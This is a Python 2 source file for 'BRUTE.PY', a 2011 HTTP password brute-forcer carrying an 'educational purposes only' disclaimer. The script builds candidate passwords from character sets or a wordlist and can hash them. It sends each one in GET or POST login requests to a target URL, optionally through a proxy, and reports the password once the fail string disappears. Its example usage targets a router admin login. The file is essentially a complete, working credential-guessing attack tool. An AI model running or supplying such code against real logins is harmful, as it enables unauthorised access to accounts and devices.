# Simple Bruteforcer by Daniel0108 #TheBlackMatrix			  #
# Disclaimer: This script is for educational purposes only.		  #
#		I am not responsible for how you use this program	  #
# .########..########..##.....##.########.########.....########..##....## #
# .##.....##.##.....##.##.....##....##....##...........##.....##..##..##. #
# .##.....##.##.....##.##.....##....##....##...........##.....##...####.. #
# .########..########..##.....##....##....######.......########.....##... #
# .##.....##.##...##...##.....##....##....##...........##...........##... #
# .##.....##.##....##..##.....##....##....##.......###.##...........##... #
# .########..##.....##..#######.....##....########.###.##...........##... #
###########################################################################
# Copyright (c) 2011, Daniel Bugl
# All rights reserved.
# 
# This program is licensed under the BSD license.
# 
# Redistribution and use in source and binary forms, with or without
# modification, are permitted provided that the following conditions are met:
# 1. Redistributions of source code must retain the above copyright
#    notice, this list of conditions and the following disclaimer.
# 2. Redistributions in binary form must reproduce the above copyright
#    notice, this list of conditions and the following disclaimer in the
#    documentation and/or other materials provided with the distribution.
# 3. All advertising materials mentioning features or use of this software
#    must display the following acknowledgement:
#    This product includes software developed by Daniel Bugl.
# 4. Neither the name of BRUTE.PY nor the
#    names of its contributors may be used to endorse or promote products
#    derived from this software without specific prior written permission.
# 
# THIS SOFTWARE IS PROVIDED BY Daniel Bugl ''AS IS'' AND ANY
# EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
# WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
# DISCLAIMED. IN NO EVENT SHALL Daniel Bugl BE LIABLE FOR ANY
# DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
# (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
# LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
# ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
# (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
# SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
###########################################################################
# Author:
#	Copyright (c) 2011 Daniel Bugl (Daniel0108)
###########################################################################
# Example usage:
#	python brute.py "http://192.168.1.254/cfg?process=login&page=start&user=admin&password=%s&submit=+Log+in+" aANs
###########################################################################

import urllib
import time
import sys
import math
import hashlib

version = "0.9.8"

f = open("./logs/brute.log", "w")

def log(status, message):
	status_raw = ""
	for i in range(3-len(status)):
		status_raw += " "
	status_raw += status
	status = status_raw
	print "[%s] [%s] %s" % (time.strftime("%d.%m.%y|%H:%M:%S"), status, message)
	f.write("[%s] [%s] %s\n" % (time.strftime("%d.%m.%y|%H:%M:%S"), status, message))

log(":)", "BRUTE.PY Bruteforcer [ :|] Version %s [ :(]" % version)
log(":)", "	by Daniel0108 #theblackmatrix")

if len(sys.argv) < 3:
	log(">:(", "You didn't specify an URL and/or modes")
	exit()

# Configuration variables
modes = sys.argv[2] # a = abcde..., A = ABCDE..., N = 0123..., s = $%!..., o = OWN BRUTES (requires a third argument)
chars = 10 # Number of characters
attack = sys.argv[1] # URL to attack, use %s for password placeholder
fail = "Wrong" # Fail string
# /Configuration variables

# Brutes - Characters BRUTE.PY uses to bruteforce passwords
brutes = ""
# /Brutes - Characters BRUTE.PY uses to bruteforce passwords

# Modes
execfile("modes.py")
# /Modes

argc = 0

for mode in modes:
	for m in mode_list:
		if mode == m[0]:
			executing = []
			for ex in range(m[2]):
				executing.append(sys.argv[ex+argc+3])
				argc += m[2]
			m[1](*executing)

min_chars = 1
max_chars = chars
burl = attack

base = len(brutes)

if logfile != None:
	f.close()
	f = open("./logs/" + logfile, "w")

start_time = time.time()
log(">:|", "Attacking '%s'..." % burl)
log(">:)", "Brutes: '%s'" % brutes)
log(">:)", "Fail-string: '%s'" % fail)
try:
	log(">:)", "Using HTTP proxy: '%s'" % proxies['http'])
except:
	log(">:(", "No proxy set.")
log(">:)", "Minimum characters: %d" % min_chars)
log(">:)", "Maximum characters: %d" % max_chars)

log(":|", "Starting bruteforce in 5 seconds.")

possibilities = 1
for i in range(min_chars-1, max_chars, 1):
	possibilities *= len(brutes)
possibilities += len(rainbows)
possibilities -= 1

status = 0

while True:
	if time.time()-start_time >= 3 and status < 1:
		status = 1
		log(":|", "Loading cannons")
	elif time.time()-start_time >= 4 and status < 2:
		status = 2
		log(":|", "FIRE!!!")
	elif time.time()-start_time >= 5 and status < 3:
		status = 3
		start_time = time.time()
		break

current = 0
brute = ""
for b in xrange(possibilities):
	if len(rainbows) > 0 and b < len(rainbows):
		brute = rainbows[b]
	else:
		num = b-len(rainbows)
		digits = []
		while True:
			digit = num % base
			digit -= 1
			digits.append(digit)
			num = num // base
			if num == 0: break
	
		digits.reverse()
		brute = "".join([brutes[d] for d in digits])

	x = brute
	if hashing == "custom" and customhash != None:
		thash = eval(customhash) # customhash should result in something and use x as the text to hash
	elif hashing != None:
		m = hashlib.new(hashing)
		m.update(x)
		thash = m.hexdigest()
	else:
		thash = x

	start_url = time.time()
	if text_instead_url == True:
		rput = burl
		if rput != thash:
			rput = fail
	else:
		url = burl % thash
		if use_post == True:
			input = urllib.urlopen(url.split("?")[0], data=url.split("?")[1], proxies=proxies)
		else:
			input = urllib.urlopen(url, proxies=proxies)
		rput = input.read()
		if debug == True: print "Result: %s" % rput
	if rput.count(fail) == 0:
		break
	else:
		the_time = round(time.time()-start_time)
		minutes = math.floor(the_time/60)
		seconds = math.floor(the_time - (minutes*60))
		if display_invalid == True:
			log(":(", "'%s' ('%s') was invalid. (%dmin %dsec) (%d/%d) (%dms)" % (brute, thash, minutes, seconds, current, possibilities, round((time.time()-start_url)*1000)))
	current += 1

log(":)", "Done, the password is: '%s'! (Took %dsec to bruteforce)" % (brute, time.time()-start_time))
